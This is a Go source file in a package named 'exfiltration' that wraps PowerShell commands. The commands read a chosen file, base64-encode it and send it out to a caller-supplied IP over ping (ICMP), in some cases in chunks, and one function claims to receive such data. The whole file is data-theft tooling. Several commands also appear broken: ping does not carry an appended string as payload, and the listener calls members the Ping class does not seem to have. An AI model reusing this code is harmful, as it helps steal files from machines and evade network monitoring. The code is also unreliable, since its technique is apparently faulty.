package exfiltration

import (
	"fmt"
	"os/exec"
)

func ICMPExfilData(targetIP, dataFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));ping -n 1 -l 1024 -w 1000 %s $data`, dataFile, targetIP))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ICMPExfilListener(interfaceName string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$listener=New-Object System.Net.NetworkInformation.Ping;$listener.Interface='%s';$listener.Receive()`, interfaceName))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ICMPExfilFile(targetIP, dataFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));$chunks=$data-replace'(.{100})','$1 ';$c=0;foreach($chunk in ($chunks-split' ')){ping -n 1 -l ($chunk.Length+28) -w 500 %s $chunk;$c++}`, dataFile, targetIP))
	out, err := cmd.CombinedOutput()
	return string(out), err
}
